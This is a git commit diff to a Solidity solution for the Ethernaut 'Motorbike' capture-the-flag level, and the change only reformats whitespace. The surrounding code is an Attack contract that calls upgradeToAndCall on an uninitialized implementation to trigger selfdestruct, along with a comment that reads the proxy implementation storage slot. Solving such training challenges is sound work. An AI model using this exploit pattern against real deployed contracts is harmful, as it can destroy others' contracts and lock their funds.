7e0db5c667c8f565d7613f3725794b791adcb55e
Çağatay Akkaş <108520279+CagatayAkkas@users.noreply.github.com>
2023-04-25 14:49:23 +0300

    Update Ethernaut25.sol

--- Ethernaut/Ethernaut25.sol
+++ Ethernaut/Ethernaut25.sol
@@ -2,13 +2,8 @@ pragma solidity ^0.8;
 
 interface IEngine {
     function upgrader() external view returns (address);
-
     function initialize() external;
-
-    function upgradeToAndCall(
-        address newImplementation,
-        bytes memory data
-    ) external payable;
+    function upgradeToAndCall(address newImplementation,bytes memory data) external payable;
 }
 
 // await web3.eth.getStorageAt(contract.address , "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
@@ -20,7 +15,6 @@ contract Attack {
             abi.encodeWithSelector(this.kill.selector)
         );
     }
-
     function kill() external {
         selfdestruct(payable(address(0)));
     }
